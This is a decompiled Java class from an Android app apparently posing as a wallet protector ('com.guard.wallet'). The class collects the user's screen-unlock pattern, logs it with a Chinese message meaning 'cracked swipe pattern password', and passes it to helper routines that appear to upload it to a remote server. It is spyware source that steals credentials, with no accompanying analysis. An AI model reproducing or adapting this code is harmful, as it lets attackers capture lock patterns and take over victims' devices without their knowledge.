package com.guard.wallet.plug;

import a1.q;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.http.l;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicReference;

public final class d implements Serializable {
   public final LinkedList a = new LinkedList();
   public ReqListenHelper b;
   public final AtomicReference c = new AtomicReference(null);

   public final void a() {
      ReqListenHelper var3 = this.b;
      AtomicReference var2 = this.c;
      LinkedList var1 = this.a;
      if (var3 != null && !var1.isEmpty()) {
         if (Objects.equals(this.b.getListenType(), 1)) {
            ReqUnlockDeviceVO var5 = new ReqUnlockDeviceVO();
            var5.setPatternCipher(new LinkedList<>());
            var5.getPatternCipher().addAll(var1);
            var5.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
            StringBuilder var4 = new StringBuilder("已破解滑动图案密码:");
            var4.append(var5);
            Log.d("com.guard.wallet.plug.d", var4.toString());
            var4 = new StringBuilder("Lock Cipher:");
            var4.append(var5);
            Log.d("com.guard.wallet.plug.d", var4.toString());
            h.C(var5);
            l.B(var5);
            if (MainApplication.getInstance() != null && !q.B(var2.get())) {
               MainApplication.getInstance().offerStrategyEvent((String)var2.get());
            }
         } else {
            RespCipherStateVO var6 = new RespCipherStateVO();
            var6.setListenType(this.b.getListenType());
            var6.setListenId(this.b.getListenId());
            var6.setSubscribeId(this.b.getSubscribeId());
            var6.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
            var6.setPatternCipher(new LinkedList<>());
            var6.getPatternCipher().addAll(var1);
            l.C(var6);
         }
      }

      var2.set(null);
      var1.clear();
   }
}
